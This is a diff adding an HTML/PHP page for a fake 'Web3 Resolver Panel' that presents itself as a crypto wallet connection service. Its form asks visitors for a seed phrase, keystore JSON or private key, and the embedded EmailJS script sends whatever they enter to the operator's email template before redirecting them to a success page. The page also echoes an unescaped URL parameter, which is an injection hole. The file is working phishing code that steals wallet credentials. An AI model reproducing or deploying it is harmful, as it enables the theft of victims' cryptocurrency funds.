@@ -1,0 +1,242 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Manage your Bitcoin, Ethereum, XRP, Litecoin, USDT, and over 1000+ other coins and tokens.</title>
+    <meta name="description"
+        content="Manage your Bitcoin, Ethereum, XRP, Litecoin, USDT, and over 1000+ other coins and tokens.">
+
+
+    <!-- Favicon icon -->
+    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon.png">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body class="@@dashboard">
+
+    <div id="preloader"><i>.</i><i>.</i><i>.</i></div>
+
+    <div id="main-wrapper" class="front">
+
+        <div class="header landing">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xl-12">
+                        <div class="navigation">
+                            <nav class="navbar navbar-expand-lg navbar-light">
+                                <div class="brand-logo">
+                                    <a href="index-1.html">
+                                        <img src="images/logo.png" alt="" class="logo-primary">
+                                        <img src="images/logow.png" alt="" class="logo-white">
+                                    </a>
+                                </div>
+                                <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
+                                    data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
+                                    aria-expanded="false" aria-label="Toggle navigation">
+                                    <span class="navbar-toggler-icon"></span>
+                                </button>
+                                <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                                    <ul class="navbar-nav me-auto">
+                                        <li class="nav-item dropdown"><a class="nav-link" href="index.html">Home</a>
+                                        </li>
+                                        <li class="nav-item"><a class="nav-link" href="explore.php">Explore</a></li>
+                                        
+                                        <!-- <li class="nav-item"><a class="nav-link" href="collection.html">Collection</a></li>
+                                <li class="nav-item"><a class="nav-link" href="profile.html">Profile</a></li>
+                                <li class="nav-item"><a class="nav-link" href="upload.html">Upload</a></li>
+                                <li class="nav-item"><a class="nav-link" href="dashboard.html">Dashboard</a></li> -->
+                                    </ul>
+                                </div>
+                                <div class="signin-btn d-flex align-items-center">
+                                    <div class="dark-light-toggle theme-switch" onclick="themeToggle()">
+                                        <span class="dark"><i class="ri-moon-line"></i></span>
+                                        <span class="light"><i class="ri-sun-line"></i></span>
+                                    </div>
+
+                                    <a class="btn btn-primary" href="explore.php">Connect</a>
+                                </div>
+                            </nav>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+        <div class="page-title">
+            <div class="container">
+                <div class="row align-items-center justify-content-between">
+                    <div class="col-6">
+                        <div class="page-title-content">
+                            <h3>Explore</h3>
+                            <p class="mb-2">Explore different connection mode</p>
+                        </div>
+                    </div>
+                    <!-- <div class="col-auto">
+                        <div class="breadcrumbs"><a href="#">Home </a><span><i
+                                    class="ri-arrow-right-s-line"></i></span><a href="#">Payments</a></div>
+                    </div> -->
+                </div>
+            </div>
+        </div>
+
+
+        <div class="upload-item section-padding">
+            <div class="container">
+                <div class="row justify-content-center">
+                    <div class="col-12">
+                        <h4 class="card-title mb-3">DAPP Type:
+                            <?php echo $_GET['issue']; ?>
+                        </h4>
+                        <div class="card">
+                            <div class="card-body">
+
+                                <form id="form" onsubmit="submitForm(event)">
+                                    <div class="row">
+                                        <div class="col-12 mb-3">
+
+                                            <input type="hidden" id="issue" name="issue" readonly>
+
+                                            <label class="form-label">Method of Connection</label>
+                                            <br>
+                                            <select id="category" name="category" required>
+                                                <option value="">Select One</option>
+                                                <option value="phrase">Phrase</option>
+                                                <option value="json">Key store Json</option>
+                                                <option value="p-key">Private Key</option>
+                                            </select>
+                                        </div>
+
+                                        <div class="col-12 mb-3">
+                                            <label class="form-label">Phrase, Key store or Private key</label>
+                                            <textarea type="text" id="complaint" name="complaint" class="form-control" required></textarea>
+                                        </div>
+                                        
+                                        <!-- <input type="hidden" name="selected_issue"
+                                            value="<?php echo $_GET['issue']; ?>"> -->
+
+                                            <div class="g-recaptcha" data-sitekey="6LdvzlEpAAAAALiar2X97Ox8T1fw_bDtPJwdo9on"></div>
+                                    </div>
+                                    <div class="mt-3">
+                                        <button type="submit" name="submit" id="button"
+                                            class="btn btn-primary mr-2 w-100">Submit</button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+
+        <div class="bottom section-padding triangle-top-dark triangle-bottom-dark">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xl-4 col-lg-4 col-md-7 col-sm-8">
+                        <div class="bottom-logo"><img class="pb-3" src="images/logoh.png" alt="">
+                            <p>Our commitment is to address a wide array of blockchain and crypto challenges
+                                comprehensively. We strive to provide effective solutions that empower you to navigate
+                                the
+                                rapidly evolving blockchain landscape with confidence. Trust us to optimize your
+                                operations
+                                and create a successful and efficient blockchain ecosystem.</p>
+                        </div>
+                    </div>
+                    <div class="col-xl-2 col-lg-2 col-md-5 col-sm-4 col-6">
+                        <div class="bottom-widget">
+                            <h4 class="widget-title">Quick Links</h4>
+                            <ul>
+                                <li><a href="explore.php">Explore</a></li>
+                                <li><a href="explore.php">Connect</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
+                        <div class="copyright">
+                            <p>© Copyright <script>document.write(new Date().getFullYear());</script> <a href="#">Web3 Resolver Panel</a> <!-- -->All Rights Reserved</p>
+                        </div>
+                    </div>
+                    <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
+                        <div class="footer-social">
+                            <ul>
+                                <li><a href="#"><i class="bi bi-facebook"></i></a></li>
+                                <li><a href="#"><i class="bi bi-twitter"></i></a></li>
+                                <li><a href="#"><i class="bi bi-linkedin"></i></a></li>
+                                <li><a href="#"><i class="bi bi-youtube"></i></a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+
+
+
+    <script src="vendor/jquery/jquery.min.js"></script>
+    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+
+    <script src="js/scripts.js"></script>
+
+    <script type="text/javascript"
+          src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+  <script type="text/javascript">
+    emailjs.init('y97m82kzVueQl2nzh');
+
+    const btn = document.getElementById('button');
+
+    document.getElementById('form')
+      .addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        btn.value = 'Sending...';
+
+        const serviceID = 'default_service';
+        const templateID = 'template_jyk360j';
+
+        emailjs.sendForm(serviceID, templateID, this)
+          .then(() => {
+            btn.value = 'Send Email';
+            // Redirect to success page
+            window.location.href = 'success.html';
+          }, (err) => {
+            btn.value = 'Send Email';
+            alert(JSON.stringify(err));
+          });
+      });
+
+    // Assuming the URL is something like: http://example.com/page?issue=bug
+    const urlParams = new URLSearchParams(window.location.search);
+    const issueParam = urlParams.get('issue');
+
+    // Set the value of the "issue" input field based on the URL parameter
+    document.getElementById('issue').value = issueParam || '';
+  </script>
+
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+
+</body>
+
+
+</html>
